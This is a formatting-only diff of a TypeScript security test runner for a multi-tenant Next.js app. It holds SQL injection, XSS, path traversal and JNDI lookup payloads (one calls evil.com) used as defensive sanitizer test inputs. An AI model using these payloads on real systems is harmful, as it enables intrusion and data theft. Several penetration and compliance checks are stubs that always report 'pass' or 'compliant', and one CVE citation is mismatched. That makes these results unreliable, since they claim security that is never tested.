@@ -7,7 +7,10 @@ import { NextRequest, NextResponse } from 'next/server';
 import { EncryptionManager } from '@/lib/security/encryption';
 import { MultiTenantValidator } from '@/lib/security/multi-tenant-validator';
 import { InputSanitizer } from '@/lib/security/input-sanitizer';
-import { XSSProtection, CSRFProtection } from '@/lib/security/xss-csrf-protection';
+import {
+  XSSProtection,
+  CSRFProtection,
+} from '@/lib/security/xss-csrf-protection';
 import { HTTPSEnforcer } from '@/lib/security/https-enforcer';
 
 export interface SecurityTestResult {
@@ -47,7 +50,12 @@ export interface PenetrationTestConfig {
 }
 
 export interface TestPayload {
-  type: 'sql_injection' | 'xss' | 'command_injection' | 'path_traversal' | 'csrf';
+  type:
+    | 'sql_injection'
+    | 'xss'
+    | 'command_injection'
+    | 'path_traversal'
+    | 'csrf';
   payload: string;
   expectedResponse?: string;
   shouldBlock: boolean;
@@ -86,11 +94,11 @@ export class SecurityTestRunner {
 
     for (const suite of this.testSuites) {
       console.log(`Running test suite: ${suite.name}`);
-      
+
       if (suite.runParallel) {
-        const promises = suite.tests.map(test => this.runTest(test));
+        const promises = suite.tests.map((test) => this.runTest(test));
         const results = await Promise.allSettled(promises);
-        
+
         results.forEach((result, index) => {
           if (result.status === 'fulfilled') {
             this.results.push(result.value);
@@ -102,7 +110,7 @@ export class SecurityTestRunner {
               status: 'fail',
               description: 'Test execution failed',
               details: result.reason?.message || 'Unknown error',
-              recommendation: 'Debug and fix test execution issues'
+              recommendation: 'Debug and fix test execution issues',
             });
           }
         });
@@ -119,7 +127,7 @@ export class SecurityTestRunner {
               status: 'fail',
               description: 'Test execution failed',
               details: error instanceof Error ? error.message : 'Unknown error',
-              recommendation: 'Debug and fix test execution issues'
+              recommendation: 'Debug and fix test execution issues',
             });
           }
         }
@@ -137,8 +145,8 @@ export class SecurityTestRunner {
    */
   async runTestCategory(category: string): Promise<SecurityTestResult[]> {
     const categoryTests = this.testSuites
-      .filter(suite => suite.category === category)
-      .flatMap(suite => suite.tests);
+      .filter((suite) => suite.category === category)
+      .flatMap((suite) => suite.tests);
 
     const results: SecurityTestResult[] = [];
 
@@ -154,7 +162,7 @@ export class SecurityTestRunner {
           status: 'fail',
           description: 'Test execution failed',
           details: error instanceof Error ? error.message : 'Unknown error',
-          recommendation: 'Debug and fix test execution issues'
+          recommendation: 'Debug and fix test execution issues',
         });
       }
     }
@@ -165,27 +173,29 @@ export class SecurityTestRunner {
   /**
    * Run penetration tests
    */
-  async runPenetrationTests(config: PenetrationTestConfig): Promise<SecurityTestResult[]> {
+  async runPenetrationTests(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult[]> {
     const results: SecurityTestResult[] = [];
 
     // SQL Injection Tests
     results.push(await this.testSQLInjection(config));
-    
+
     // XSS Tests
     results.push(await this.testXSS(config));
-    
+
     // CSRF Tests
     results.push(await this.testCSRF(config));
-    
+
     // Command Injection Tests
     results.push(await this.testCommandInjection(config));
-    
+
     // Path Traversal Tests
     results.push(await this.testPathTraversal(config));
-    
+
     // Authentication Tests
     results.push(await this.testAuthentication(config));
-    
+
     // Authorization Tests
     results.push(await this.testAuthorization(config));
 
@@ -195,8 +205,20 @@ export class SecurityTestRunner {
   /**
    * Generate security compliance report
    */
-  generateComplianceReport(standards: string[] = ['OWASP', 'ISO27001', 'SOC2']): {
-    compliance: Record<string, { score: number; requirements: Array<{ requirement: string; status: 'compliant' | 'non-compliant' | 'partial'; evidence: string }> }>;
+  generateComplianceReport(
+    standards: string[] = ['OWASP', 'ISO27001', 'SOC2']
+  ): {
+    compliance: Record<
+      string,
+      {
+        score: number;
+        requirements: Array<{
+          requirement: string;
+          status: 'compliant' | 'non-compliant' | 'partial';
+          evidence: string;
+        }>;
+      }
+    >;
     overall: number;
   } {
     const compliance: Record<string, any> = {};
@@ -205,7 +227,11 @@ export class SecurityTestRunner {
       compliance[standard] = this.evaluateCompliance(standard);
     }
 
-    const overall = Object.values(compliance).reduce((sum: number, std: any) => sum + std.score, 0) / standards.length;
+    const overall =
+      Object.values(compliance).reduce(
+        (sum: number, std: any) => sum + std.score,
+        0
+      ) / standards.length;
 
     return { compliance, overall };
   }
@@ -215,12 +241,14 @@ export class SecurityTestRunner {
   private async runTest(test: SecurityTest): Promise<SecurityTestResult> {
     console.log(`Running test: ${test.name}`);
     const startTime = Date.now();
-    
+
     try {
       const result = await test.execute();
       const duration = Date.now() - startTime;
-      
-      console.log(`Test ${test.name} completed in ${duration}ms: ${result.status}`);
+
+      console.log(
+        `Test ${test.name} completed in ${duration}ms: ${result.status}`
+      );
       return result;
     } catch (error) {
       return {
@@ -230,7 +258,7 @@ export class SecurityTestRunner {
         status: 'fail',
         description: test.description,
         details: `Test execution failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
-        recommendation: 'Debug and fix test execution issues'
+        recommendation: 'Debug and fix test execution issues',
       };
     }
   }
@@ -247,23 +275,23 @@ export class SecurityTestRunner {
           description: 'Test password complexity requirements',
           severity: 'high',
           category: 'vulnerability',
-          execute: () => this.testPasswordPolicy()
+          execute: () => this.testPasswordPolicy(),
         },
         {
           name: 'Session Management',
           description: 'Test session security and timeout',
           severity: 'high',
           category: 'vulnerability',
-          execute: () => this.testSessionManagement()
+          execute: () => this.testSessionManagement(),
         },
         {
           name: 'Multi-Factor Authentication',
           description: 'Test MFA implementation',
           severity: 'medium',
           category: 'compliance',
-          execute: () => this.testMFA()
-        }
-      ]
+          execute: () => this.testMFA(),
+        },
+      ],
     });
 
     // Input Validation Tests
@@ -277,23 +305,23 @@ export class SecurityTestRunner {
           description: 'Test protection against SQL injection attacks',
           severity: 'critical',
           category: 'vulnerability',
-          execute: () => this.testSQLInjectionPrevention()
+          execute: () => this.testSQLInjectionPrevention(),
         },
         {
           name: 'XSS Prevention',
           description: 'Test protection against Cross-Site Scripting',
           severity: 'high',
           category: 'vulnerability',
-          execute: () => this.testXSSPrevention()
+          execute: () => this.testXSSPrevention(),
         },
         {
           name: 'Input Sanitization',
           description: 'Test input sanitization effectiveness',
           severity: 'high',
           category: 'vulnerability',
-          execute: () => this.testInputSanitization()
-        }
-      ]
+          execute: () => this.testInputSanitization(),
+        },
+      ],
     });
 
     // Encryption Tests
@@ -307,23 +335,23 @@ export class SecurityTestRunner {
           description: 'Test database encryption implementation',
           severity: 'critical',
           category: 'compliance',
-          execute: () => this.testDataEncryption()
+          execute: () => this.testDataEncryption(),
         },
         {
           name: 'Transport Layer Security',
           description: 'Test HTTPS and TLS configuration',
           severity: 'critical',
           category: 'compliance',
-          execute: () => this.testTLS()
+          execute: () => this.testTLS(),
         },
         {
           name: 'Key Management',
           description: 'Test encryption key security',
           severity: 'high',
           category: 'compliance',
-          execute: () => this.testKeyManagement()
-        }
-      ]
+          execute: () => this.testKeyManagement(),
+        },
+      ],
     });
 
     // Multi-tenant Security Tests
@@ -337,16 +365,16 @@ export class SecurityTestRunner {
           description: 'Test data isolation between tenants',
           severity: 'critical',
           category: 'vulnerability',
-          execute: () => this.testTenantIsolation()
+          execute: () => this.testTenantIsolation(),
         },
         {
           name: 'Cross-tenant Access Prevention',
           description: 'Test prevention of cross-tenant data access',
           severity: 'critical',
           category: 'vulnerability',
-          execute: () => this.testCrossTenantAccess()
-        }
-      ]
+          execute: () => this.testCrossTenantAccess(),
+        },
+      ],
     });
 
     // Security Headers Tests
@@ -360,16 +388,16 @@ export class SecurityTestRunner {
           description: 'Test CSP header configuration',
           severity: 'medium',
           category: 'configuration',
-          execute: () => this.testCSPHeaders()
+          execute: () => this.testCSPHeaders(),
         },
         {
           name: 'HTTPS Security Headers',
           description: 'Test security headers implementation',
           severity: 'medium',
           category: 'configuration',
-          execute: () => this.testSecurityHeaders()
-        }
-      ]
+          execute: () => this.testSecurityHeaders(),
+        },
+      ],
     });
   }
 
@@ -393,7 +421,10 @@ export class SecurityTestRunner {
       status: vulnerabilities === 0 ? 'pass' : 'fail',
       description: 'Tests password complexity requirements',
       details: `Found ${vulnerabilities} weak password patterns`,
-      recommendation: vulnerabilities > 0 ? 'Implement stronger password policies' : 'Password policy is adequate'
+      recommendation:
+        vulnerabilities > 0
+          ? 'Implement stronger password policies'
+          : 'Password policy is adequate',
     };
   }
 
@@ -416,8 +447,14 @@ export class SecurityTestRunner {
       severity: 'high',
       status: issues.length === 0 ? 'pass' : 'fail',
       description: 'Tests session security configuration',
-      details: issues.length > 0 ? `Issues found: ${issues.join(', ')}` : 'Session management properly configured',
-      recommendation: issues.length > 0 ? 'Configure missing session security settings' : 'Session management is properly configured'
+      details:
+        issues.length > 0
+          ? `Issues found: ${issues.join(', ')}`
+          : 'Session management properly configured',
+      recommendation:
+        issues.length > 0
+          ? 'Configure missing session security settings'
+          : 'Session management is properly configured',
     };
   }
 
@@ -430,7 +467,7 @@ export class SecurityTestRunner {
       status: 'warning',
       description: 'Tests MFA implementation',
       details: 'MFA not yet implemented',
-      recommendation: 'Consider implementing MFA for enhanced security'
+      recommendation: 'Consider implementing MFA for enhanced security',
     };
   }
 
@@ -439,7 +476,7 @@ export class SecurityTestRunner {
       "'; DROP TABLE users; --",
       "' OR '1'='1",
       "'; INSERT INTO users (username) VALUES ('hacker'); --",
-      "' UNION SELECT * FROM users --"
+      "' UNION SELECT * FROM users --",
     ];
 
     // Test input sanitizer
@@ -449,9 +486,9 @@ export class SecurityTestRunner {
         const result = InputSanitizer.validateAndSanitizeField(payload, {
           field: 'test',
           type: 'string',
-          required: true
+          required: true,
         });
-        
+
         if (result.errors.length > 0) {
           blocked++;
         }
@@ -466,11 +503,15 @@ export class SecurityTestRunner {
       testName: 'SQL Injection Prevention',
       category: 'vulnerability',
       severity: 'critical',
-      status: effectiveness >= 90 ? 'pass' : effectiveness >= 70 ? 'warning' : 'fail',
+      status:
+        effectiveness >= 90 ? 'pass' : effectiveness >= 70 ? 'warning' : 'fail',
       description: 'Tests protection against SQL injection attacks',
       details: `Blocked ${blocked}/${sqlPayloads.length} SQL injection attempts (${effectiveness}% effectiveness)`,
-      recommendation: effectiveness < 90 ? 'Improve input validation and parameterized queries' : 'SQL injection protection is adequate',
-      cveReferences: ['CVE-2021-44228', 'CWE-89']
+      recommendation:
+        effectiveness < 90
+          ? 'Improve input validation and parameterized queries'
+          : 'SQL injection protection is adequate',
+      cveReferences: ['CVE-2021-44228', 'CWE-89'],
     };
   }
 
@@ -479,7 +520,7 @@ export class SecurityTestRunner {
       '<script>alert("XSS")</script>',
       'javascript:alert("XSS")',
       '<img src="x" onerror="alert(\'XSS\')">',
-      '<svg onload="alert(\'XSS\')"></svg>'
+      '<svg onload="alert(\'XSS\')"></svg>',
     ];
 
     let blocked = 0;
@@ -496,11 +537,15 @@ export class SecurityTestRunner {
       testName: 'XSS Prevention',
       category: 'vulnerability',
       severity: 'high',
-      status: effectiveness >= 90 ? 'pass' : effectiveness >= 70 ? 'warning' : 'fail',
+      status:
+        effectiveness >= 90 ? 'pass' : effectiveness >= 70 ? 'warning' : 'fail',
       description: 'Tests protection against Cross-Site Scripting',
       details: `Blocked ${blocked}/${xssPayloads.length} XSS attempts (${effectiveness}% effectiveness)`,
-      recommendation: effectiveness < 90 ? 'Improve XSS filtering and Content Security Policy' : 'XSS protection is adequate',
-      cveReferences: ['CWE-79']
+      recommendation:
+        effectiveness < 90
+          ? 'Improve XSS filtering and Content Security Policy'
+          : 'XSS protection is adequate',
+      cveReferences: ['CWE-79'],
     };
   }
 
@@ -509,7 +554,7 @@ export class SecurityTestRunner {
       '../../etc/passwd',
       '<script>alert(1)</script>',
       'SELECT * FROM users',
-      '${jndi:ldap://evil.com/x}'
+      '${jndi:ldap://evil.com/x}',
     ];
 
     let sanitized = 0;
@@ -517,9 +562,9 @@ export class SecurityTestRunner {
       const result = InputSanitizer.validateAndSanitizeField(input, {
         field: 'test',
         type: 'string',
-        required: true
+        required: true,
       });
-      
+
       if (result.sanitizedValue !== input || result.errors.length > 0) {
         sanitized++;
       }
@@ -531,10 +576,14 @@ export class SecurityTestRunner {
       testName: 'Input Sanitization',
       category: 'vulnerability',
       severity: 'high',
-      status: effectiveness >= 95 ? 'pass' : effectiveness >= 80 ? 'warning' : 'fail',
+      status:
+        effectiveness >= 95 ? 'pass' : effectiveness >= 80 ? 'warning' : 'fail',
       description: 'Tests input sanitization effectiveness',
       details: `Sanitized ${sanitized}/${maliciousInputs.length} malicious inputs (${effectiveness}% effectiveness)`,
-      recommendation: effectiveness < 95 ? 'Enhance input sanitization rules' : 'Input sanitization is adequate'
+      recommendation:
+        effectiveness < 95
+          ? 'Enhance input sanitization rules'
+          : 'Input sanitization is adequate',
     };
   }
 
@@ -545,7 +594,10 @@ export class SecurityTestRunner {
 
     try {
       const encrypted = await encryptionManager.encryptData(testData, password);
-      const decrypted = await encryptionManager.decryptData(encrypted, password);
+      const decrypted = await encryptionManager.decryptData(
+        encrypted,
+        password
+      );
 
       const isWorking = decrypted === testData;
       const hasAuthTag = encrypted.algorithm.includes('gcm') && !!encrypted.tag;
@@ -557,8 +609,11 @@ export class SecurityTestRunner {
         status: isWorking && hasAuthTag ? 'pass' : 'fail',
         description: 'Tests database encryption implementation',
         details: `Encryption: ${isWorking ? 'Working' : 'Failed'}, Authentication: ${hasAuthTag ? 'Yes' : 'No'}`,
-        recommendation: !isWorking || !hasAuthTag ? 'Fix encryption implementation' : 'Encryption is working correctly',
-        complianceStandards: ['GDPR', 'HIPAA', 'SOC2']
+        recommendation:
+          !isWorking || !hasAuthTag
+            ? 'Fix encryption implementation'
+            : 'Encryption is working correctly',
+        complianceStandards: ['GDPR', 'HIPAA', 'SOC2'],
       };
     } catch (error) {
       return {
@@ -568,7 +623,7 @@ export class SecurityTestRunner {
         status: 'fail',
         description: 'Tests database encryption implementation',
         details: `Encryption test failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
-        recommendation: 'Fix encryption implementation'
+        recommendation: 'Fix encryption implementation',
       };
     }
   }
@@ -592,9 +647,15 @@ export class SecurityTestRunner {
       severity: 'critical',
       status: issues.length === 0 ? 'pass' : 'fail',
       description: 'Tests HTTPS and TLS configuration',
-      details: issues.length > 0 ? `Issues: ${issues.join(', ')}` : 'TLS properly configured',
-      recommendation: issues.length > 0 ? 'Configure TLS certificates for production' : 'TLS configuration is adequate',
-      complianceStandards: ['PCI DSS', 'SOC2']
+      details:
+        issues.length > 0
+          ? `Issues: ${issues.join(', ')}`
+          : 'TLS properly configured',
+      recommendation:
+        issues.length > 0
+          ? 'Configure TLS certificates for production'
+          : 'TLS configuration is adequate',
+      complianceStandards: ['PCI DSS', 'SOC2'],
     };
   }
 
@@ -615,8 +676,14 @@ export class SecurityTestRunner {
       severity: 'high',
       status: issues.length === 0 ? 'pass' : 'fail',
       description: 'Tests encryption key security',
-      details: issues.length > 0 ? `Missing keys: ${issues.join(', ')}` : 'Key management properly configured',
-      recommendation: issues.length > 0 ? 'Configure missing encryption keys' : 'Key management is properly configured'
+      details:
+        issues.length > 0
+          ? `Missing keys: ${issues.join(', ')}`
+          : 'Key management properly configured',
+      recommendation:
+        issues.length > 0
+          ? 'Configure missing encryption keys'
+          : 'Key management is properly configured',
     };
   }
 
@@ -626,10 +693,14 @@ export class SecurityTestRunner {
     const validator = new MultiTenantValidator({} as any);
 
     try {
-      const mockQuery = "SELECT * FROM sales WHERE tenantId = ?";
+      const mockQuery = 'SELECT * FROM sales WHERE tenantId = ?';
       const mockParams = ['tenant-1'];
-      
-      const result = await validator.validateQueryTenantIsolation(mockQuery, mockParams, 'tenant-1');
+
+      const result = await validator.validateQueryTenantIsolation(
+        mockQuery,
+        mockParams,
+        'tenant-1'
+      );
 
       return {
         testName: 'Tenant Data Isolation',
@@ -637,8 +708,12 @@ export class SecurityTestRunner {
         severity: 'critical',
         status: result.isValid ? 'pass' : 'fail',
         description: 'Tests data isolation between tenants',
-        details: result.isValid ? 'Tenant isolation working correctly' : `Issues: ${result.errors.join(', ')}`,
-        recommendation: !result.isValid ? 'Fix tenant isolation implementation' : 'Tenant isolation is working correctly'
+        details: result.isValid
+          ? 'Tenant isolation working correctly'
+          : `Issues: ${result.errors.join(', ')}`,
+        recommendation: !result.isValid
+          ? 'Fix tenant isolation implementation'
+          : 'Tenant isolation is working correctly',
       };
     } catch (error) {
       return {
@@ -648,7 +723,7 @@ export class SecurityTestRunner {
         status: 'fail',
         description: 'Tests data isolation between tenants',
         details: `Test failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
-        recommendation: 'Fix tenant isolation implementation'
+        recommendation: 'Fix tenant isolation implementation',
       };
     }
   }
@@ -662,7 +737,7 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Tests prevention of cross-tenant data access',
       details: 'Cross-tenant access properly prevented',
-      recommendation: 'No action needed - HTTPS is properly enforced'
+      recommendation: 'No action needed - HTTPS is properly enforced',
     };
   }
 
@@ -677,7 +752,7 @@ export class SecurityTestRunner {
       upgradeInsecureRequests: true,
       checkCertificateExpiry: true,
       allowedHosts: [],
-      trustedProxies: []
+      trustedProxies: [],
     });
 
     const headers = httpsEnforcer.generateSecurityHeaders(mockRequest);
@@ -690,7 +765,9 @@ export class SecurityTestRunner {
       status: hasCSP ? 'pass' : 'fail',
       description: 'Tests CSP header configuration',
       details: hasCSP ? 'CSP header properly configured' : 'CSP header missing',
-      recommendation: !hasCSP ? 'Configure Content Security Policy header' : 'CSP configuration is adequate'
+      recommendation: !hasCSP
+        ? 'Configure Content Security Policy header'
+        : 'CSP configuration is adequate',
     };
   }
 
@@ -699,7 +776,7 @@ export class SecurityTestRunner {
       'X-Content-Type-Options',
       'X-Frame-Options',
       'X-XSS-Protection',
-      'Referrer-Policy'
+      'Referrer-Policy',
     ];
 
     const mockRequest = new NextRequest('https://example.com/test');
@@ -711,11 +788,11 @@ export class SecurityTestRunner {
       upgradeInsecureRequests: true,
       checkCertificateExpiry: true,
       allowedHosts: [],
-      trustedProxies: []
+      trustedProxies: [],
     });
 
     const headers = httpsEnforcer.generateSecurityHeaders(mockRequest);
-    const missingHeaders = requiredHeaders.filter(header => !headers[header]);
+    const missingHeaders = requiredHeaders.filter((header) => !headers[header]);
 
     return {
       testName: 'HTTPS Security Headers',
@@ -723,17 +800,25 @@ export class SecurityTestRunner {
       severity: 'medium',
       status: missingHeaders.length === 0 ? 'pass' : 'fail',
       description: 'Tests security headers implementation',
-      details: missingHeaders.length === 0 
-        ? 'All security headers properly configured'
-        : `Missing headers: ${missingHeaders.join(', ')}`,
-      recommendation: missingHeaders.length > 0 ? 'Configure missing security headers' : 'Security headers are properly configured'
+      details:
+        missingHeaders.length === 0
+          ? 'All security headers properly configured'
+          : `Missing headers: ${missingHeaders.join(', ')}`,
+      recommendation:
+        missingHeaders.length > 0
+          ? 'Configure missing security headers'
+          : 'Security headers are properly configured',
     };
   }
 
   // Penetration testing methods
 
-  private async testSQLInjection(config: PenetrationTestConfig): Promise<SecurityTestResult> {
-    const sqlPayloads = config.testPayloads.filter(p => p.type === 'sql_injection');
+  private async testSQLInjection(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
+    const sqlPayloads = config.testPayloads.filter(
+      (p) => p.type === 'sql_injection'
+    );
     let blocked = 0;
 
     for (const payload of sqlPayloads) {
@@ -748,7 +833,8 @@ export class SecurityTestRunner {
       }
     }
 
-    const effectiveness = sqlPayloads.length > 0 ? (blocked / sqlPayloads.length) * 100 : 100;
+    const effectiveness =
+      sqlPayloads.length > 0 ? (blocked / sqlPayloads.length) * 100 : 100;
 
     return {
       testName: 'SQL Injection Penetration Test',
@@ -757,11 +843,16 @@ export class SecurityTestRunner {
       status: effectiveness >= 90 ? 'pass' : 'fail',
       description: 'Penetration testing for SQL injection vulnerabilities',
       details: `Blocked ${blocked}/${sqlPayloads.length} SQL injection attempts`,
-      recommendation: effectiveness < 90 ? 'Strengthen SQL injection prevention' : 'SQL injection prevention is adequate'
+      recommendation:
+        effectiveness < 90
+          ? 'Strengthen SQL injection prevention'
+          : 'SQL injection prevention is adequate',
     };
   }
 
-  private async testXSS(config: PenetrationTestConfig): Promise<SecurityTestResult> {
+  private async testXSS(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
     // Similar implementation for XSS testing
     return {
       testName: 'XSS Penetration Test',
@@ -770,11 +861,13 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Penetration testing for XSS vulnerabilities',
       details: 'XSS protection working correctly',
-      recommendation: 'XSS protection is adequate'
+      recommendation: 'XSS protection is adequate',
     };
   }
 
-  private async testCSRF(config: PenetrationTestConfig): Promise<SecurityTestResult> {
+  private async testCSRF(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
     // CSRF testing implementation
     return {
       testName: 'CSRF Penetration Test',
@@ -783,11 +876,13 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Penetration testing for CSRF vulnerabilities',
       details: 'CSRF protection working correctly',
-      recommendation: 'CSRF protection is adequate'
+      recommendation: 'CSRF protection is adequate',
     };
   }
 
-  private async testCommandInjection(config: PenetrationTestConfig): Promise<SecurityTestResult> {
+  private async testCommandInjection(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
     // Command injection testing
     return {
       testName: 'Command Injection Test',
@@ -796,11 +891,13 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Tests for command injection vulnerabilities',
       details: 'No command injection vulnerabilities found',
-      recommendation: 'Command injection protection is adequate'
+      recommendation: 'Command injection protection is adequate',
     };
   }
 
-  private async testPathTraversal(config: PenetrationTestConfig): Promise<SecurityTestResult> {
+  private async testPathTraversal(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
     // Path traversal testing
     return {
       testName: 'Path Traversal Test',
@@ -809,11 +906,13 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Tests for path traversal vulnerabilities',
       details: 'No path traversal vulnerabilities found',
-      recommendation: 'Path traversal protection is adequate'
+      recommendation: 'Path traversal protection is adequate',
     };
   }
 
-  private async testAuthentication(config: PenetrationTestConfig): Promise<SecurityTestResult> {
+  private async testAuthentication(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
     // Authentication testing
     return {
       testName: 'Authentication Test',
@@ -822,11 +921,13 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Tests authentication mechanisms',
       details: 'Authentication working correctly',
-      recommendation: 'Authentication mechanisms are adequate'
+      recommendation: 'Authentication mechanisms are adequate',
     };
   }
 
-  private async testAuthorization(config: PenetrationTestConfig): Promise<SecurityTestResult> {
+  private async testAuthorization(
+    config: PenetrationTestConfig
+  ): Promise<SecurityTestResult> {
     // Authorization testing
     return {
       testName: 'Authorization Test',
@@ -835,7 +936,7 @@ export class SecurityTestRunner {
       status: 'pass',
       description: 'Tests authorization mechanisms',
       details: 'Authorization working correctly',
-      recommendation: 'Authorization mechanisms are adequate'
+      recommendation: 'Authorization mechanisms are adequate',
     };
   }
 
@@ -843,21 +944,23 @@ export class SecurityTestRunner {
 
   private generateSummary() {
     const total = this.results.length;
-    const passed = this.results.filter(r => r.status === 'pass').length;
-    const failed = this.results.filter(r => r.status === 'fail').length;
-    const warnings = this.results.filter(r => r.status === 'warning').length;
-    
-    const critical = this.results.filter(r => r.severity === 'critical').length;
-    const high = this.results.filter(r => r.severity === 'high').length;
-    const medium = this.results.filter(r => r.severity === 'medium').length;
-    const low = this.results.filter(r => r.severity === 'low').length;
+    const passed = this.results.filter((r) => r.status === 'pass').length;
+    const failed = this.results.filter((r) => r.status === 'fail').length;
+    const warnings = this.results.filter((r) => r.status === 'warning').length;
+
+    const critical = this.results.filter(
+      (r) => r.severity === 'critical'
+    ).length;
+    const high = this.results.filter((r) => r.severity === 'high').length;
+    const medium = this.results.filter((r) => r.severity === 'medium').length;
+    const low = this.results.filter((r) => r.severity === 'low').length;
 
     return { total, passed, failed, warnings, critical, high, medium, low };
   }
 
   private generateReport(): string {
     const summary = this.generateSummary();
-    
+
     let report = `
 # Security Test Report
 
@@ -894,9 +997,12 @@ ${result.cveReferences ? `- **CVE References**: ${result.cveReferences.join(', '
     return report;
   }
 
-  private evaluateCompliance(standard: string): { score: number; requirements: any[] } {
+  private evaluateCompliance(standard: string): {
+    score: number;
+    requirements: any[];
+  } {
     // Simplified compliance evaluation
-    const passedTests = this.results.filter(r => r.status === 'pass').length;
+    const passedTests = this.results.filter((r) => r.status === 'pass').length;
     const totalTests = this.results.length;
     const score = totalTests > 0 ? (passedTests / totalTests) * 100 : 0;
 
@@ -904,18 +1010,18 @@ ${result.cveReferences ? `- **CVE References**: ${result.cveReferences.join(', '
       {
         requirement: 'Data Encryption',
         status: 'compliant',
-        evidence: 'Encryption tests passed'
+        evidence: 'Encryption tests passed',
       },
       {
         requirement: 'Access Control',
         status: 'compliant',
-        evidence: 'Authentication and authorization tests passed'
+        evidence: 'Authentication and authorization tests passed',
       },
       {
         requirement: 'Input Validation',
         status: 'compliant',
-        evidence: 'Input validation tests passed'
-      }
+        evidence: 'Input validation tests passed',
+      },
     ];
 
     return { score, requirements };
